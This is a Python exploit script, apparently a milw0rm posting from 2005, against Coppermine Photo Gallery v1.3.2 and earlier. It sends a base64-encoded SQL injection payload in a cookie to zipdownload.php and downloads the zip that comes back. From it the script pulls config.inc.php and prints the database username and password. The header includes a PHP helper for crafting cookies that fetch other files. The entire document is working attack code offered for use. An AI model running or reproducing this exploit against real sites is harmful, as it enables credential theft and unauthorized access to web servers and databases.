# tested and approved /str0ke

#CPG Exploit
#File Retrieval by SQL Injection.
#By Default this exploit get the config.inc.php file which
#contains the db user/pass
#If you want to get another file you need to have the good cookie
#you can use this phpscript to get good cookie :
##<?
##$tab[]=$_GET['inj'];
##$val=base64_encode(serialize($tab));
##echo $val;
##?>
#
#By DiGiTAL_MiDWAY


import urllib2, sys
from urllib import urlencode
import zipfile

if(len(sys.argv)<2):
    print 'usage : %s http://host/Path/ tableprefix[default : cpg132_ for v1.3.1 use cpg1d_]' % sys.argv[0]
    sys.exit(0)
site=sys.argv[1]
try:
    prefix=sys.argv[2]
except:
    prefix='cpg132_'

print '''File Retrieval by SQL Injection for Coppermine Photo Gallery v<=1.3.2
                   by DiGiTAL_MiDWAY [digital.midway@gmail.com]'''

cook='YToxOntpOjA7czo1MToiJycpIFVOSU9OIFNFTEVDVCAnLi4vaW5jbHVkZS8nLCAnY29uZmlnLmluYy5waHAnIC8qIjt9'
# '') UNION SELECT filepath,file /*

req=urllib2.Request(site+'zipdownload.php')
req.add_header('Cookie', urlencode({prefix+'fav' : cook}))

zip=open('test.zip', 'wb')
print '[+]Opening WebPage'
try:
    f=urllib2.urlopen(req).read()
except:
    print '[+]Failed to opening website', sys.exc_info()
    sys.exit(0)
zip.write(f)
zip.close()
monzip=zipfile.ZipFile('test.zip', 'r')
try:
    conf=monzip.read('config.inc.php')
except:
    print '[+]Exploit failed....'
    sys.exit(0)
monzip.close()
conf=conf[conf.find("$CONFIG['dbuser'] =")+len("$CONFIG['dbuser'] ="):]
conf=conf[conf.find("'")+1:]
user=conf[:conf.find("'")]
conf=conf[conf.find("$CONFIG['dbpass'] =")+len("$CONFIG['dbpass'] ="):]
conf=conf[conf.find("'")+1:]
passwd=conf[:conf.find("'")]
print '[+]Exploit Succeed'
print '[+]User :', user, 'Pass :', passwd

# milw0rm.com [2005-11-13]